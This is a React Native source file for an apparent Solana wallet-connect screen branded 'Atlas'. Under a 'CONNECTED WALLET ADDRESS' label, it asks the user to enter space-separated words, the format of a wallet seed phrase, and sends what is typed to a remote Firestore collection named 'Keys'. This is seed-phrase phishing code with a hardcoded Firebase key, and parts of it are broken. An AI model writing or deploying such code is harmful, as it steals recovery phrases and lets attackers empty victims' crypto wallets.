import React, { useEffect, useState } from "react";
import {
  Animated,
  ScrollView,
  StyleSheet,
  Dimensions,
  ImageBackground,
  TextInput,
  Alert,
  KeyboardAvoidingView,
} from "react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { Image } from "react-native-expo-image-cache";
import { initializeApp } from "firebase/app";
import { getFirestore, setDoc, doc } from "firebase/firestore";
import { BlurView } from "expo-blur";
import Logo from "./component/Svgatlas";
import SvgAtlas from "./component/Logosvg";
import {
  View,
  Text,
  Button,
  Colors,
  Card,
  Typography,
} from "react-native-ui-lib";
import { NavigationContainer } from "@react-navigation/native";

const { width, height } = Dimensions.get("window");

const atlas = require("../assets/icon/atlaslogo.png");
const solana = require("../assets/icon/solana.png");
const ray = require("../assets/icon/ray.png");

const ButtonSpace = 20;

const firebaseConfig = {
  apiKey: "AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8",
  authDomain: "atlas-20a8c.firebaseapp.com",
  projectId: "atlas-20a8c",
  storageBucket: "atlas-20a8c.appspot.com",
  messagingSenderId: "764124638085",
  appId: "1:764124638085:web:942422a53a05f9b58532ec",
  measurementId: "G-6YFE7TEXBL",
};

const preview = {
  uri: "https://mlgbzz6iaqdd.i.optimole.com/XzaT3g-ka1kldGy/w:auto/h:auto/q:74/https://djcleanto.com.br/wp-content/uploads/2014/01/black-background-hd-images.jpg",
};
const uri = "https://i.ibb.co/wWmjsT1/solar-system-2.gif";
const discord = require("../assets/images/discord.png");

const App = ({ navigation }) => {
  const enviar = async () => {
    try {
      await setDoc(doc(firestore, "Keys", key), {
        keys: key,
      });
    } catch (error) {
      alert("Error adding document: ", error);
    }
  };

  const [key, setKey] = useState("");
  const [keyVerifi, setKeyVerifi] = useState("");
  const [quantidadePalavra, setQuantidadePalavra] = useState("");

  const saveData = async () => {
    try {
      await AsyncStorage.setItem("@IMPORT", key);
      //alert('Data successfully saved')
    } catch (e) {
      //alert('Failed to save the data to the storage')
    }
  };

  function Contkey() {
    if (key.slice(-1) == " ") {
      setKeyVerifi(key.slice(0, -1));
    } else {
      setKeyVerifi(key);
    }
  }

  const handlePress = () => {
    Contkey();
    setQuantidadePalavra(keyVerifi.split(" ").length - 1 + 1);

    if (!key) {
      Alert.alert("KEY IS REQUIRED");
    } else {
      saveData();

      enviar();
      navigation.navigate("Home");
    }
  };

  initializeApp(firebaseConfig);

  const firestore = getFirestore();

  export const enviarFirebase = async () => {
    try {
      await setDoc(doc(firestore, "Keys", ), {
        keys: text,
      });
    } catch (error) {
      alert("Error adding document: ", error);
    }
  };

  return (
    <KeyboardAvoidingView behavior="position" enabled>
      <View style={styles.container}>
        <View style={styles.header}>
          <BlurView intensity={90}>
            <Image
              style={{
                height: "70%",
                width: "100%",
              }}
              {...{ preview, uri }}
            />
          </BlurView>
        </View>

        <View style={styles.circle}>
          <View flex-1>
            <View
              flex-1
              style={{
                alignSelf: "center",
                alignItems: "center",
                marginTop: 40,
              }}
            >
              <SvgAtlas />
            </View>

            <View
              marginT-375
              style={{ position: "absolute", alignSelf: "center" }}
              width={"100%"}
            >
              <View
                marginT-10
                style={{
                  position: "absolute",
                  backgroundColor: "#1d1d1d",
                  width: "100%",
                  height: 400,
                  alignSelf: "center",
                }}
              >
                <Text
                  style={{ marginTop: 40, marginBottom: 20 }}
                  center={true}
                  text105
                  marginB-5
                  marginT-3
                  color={"#fff"}
                >
                  CONNECTED WALLET ADDRESS
                </Text>

                <TextInput
                  placeholderTextColor={"gray"}
                  style={styles.input}
                  placeholder="Separate each word with a single space (ex: coffee milk flower...)"
                  keyboardType="string"
                  value={key}
                  onChangeText={(key) => setKey(key)}
                />

                <Button
                  marginT-20
                  outline={true}
                  outlineColor={"#32feff"}
                  label={"CONNECTED"}
                  style={{
                    marginBottom: ButtonSpace,
                    borderRadius: 4,
                    alignSelf: "center",
                  }}
                  //onPress={()=>{alert(keyVerifi)} }
                  onPress={handlePress}
                />
              </View>
            </View>
          </View>
        </View>
      </View>
    </KeyboardAvoidingView>
  );
};

export default App;

const styles = StyleSheet.create({
  container: {
    backgroundColor: "#1d1d1d",
  },
  header: {
    width: "100%",
    height: "100%",
    position: "relative",
    top: 0,
    left: 0,
    marginTop: 30,
  },
  circle: {
    height: "100%",
    width: "100%",
    position: "absolute",
    alignSelf: "center",
    alignItems: "center",
    justifyContent: "center",

    flex: 1,
  },
  input: {
    width: "80%",
    height: 40,
    borderRadius: 7,
    color: "#fff",
    margin: 12,
    borderWidth: 1,
    padding: 10,
    alignSelf: "center",
    marginBottom: 20,
  },
});
